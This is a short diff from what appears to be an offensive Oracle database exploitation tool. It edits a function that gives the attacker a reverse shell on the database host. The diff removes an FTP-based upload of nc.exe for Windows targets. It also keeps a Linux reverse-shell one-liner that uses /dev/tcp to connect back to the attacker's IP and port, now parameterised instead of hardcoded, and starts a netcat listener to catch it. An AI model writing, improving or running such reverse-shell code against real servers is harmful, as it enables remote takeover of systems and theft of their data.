@@ -210,20 +210,10 @@ CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand" AS
 		Give a reverse tcp shell via nc
 		Need upload nc.exe if the remote system is windows
 		'''
-		BIN_NAMEFILE = "nc.exe"
-		FTP_CMDS_FILENAME = "C\\temp\\cmd.txt"
-		FTP_COMMANDS = '''
-		echo 'binary' > {0}
-		echo 'mget {1}' > {0}
-		echo 'disconnect' > {0}
-		echo 'quit' > {0}
-		'''.format(FTP_CMDS_FILENAME,BIN_NAMEFILE)
-		FTP_GET_FILE_COMMAND = "ftp -a -s:{0}".format(FTP_CMDS_FILENAME)
 		if self.remoteSystemIsWindows() == True :
-			logging.info('The remote system is windows. I will upload the nc.exe binary on the remote server to give you a reverse shell')
-			#self.execOSCommand(cmd="",printResponse=True, needCreateClassAndFunction = True, needDeleteClassAndFunction = True)
+			logging.warn("Java reverse shell is not implement for Windows yet")
 		elif self.remoteSystemIsLinux() == True :
-			CMD = "exec 5<>/dev/tcp/{0}/{1}; /bin/cat <&5 | while read line; do $line 2>&5 >&5; done".format("192.168.56.1",localport)
+			CMD = "exec 5<>/dev/tcp/{0}/{1}; /bin/cat <&5 | while read line; do $line 2>&5 >&5; done".format(localip,localport)
 			self.args['print'].goodNews("The reverse shell try to connect to {0}:{1}".format(localip,localport))
 			a = Thread(None, self.__runListenNC__, None, (), {'port':localport})
 			a.start()
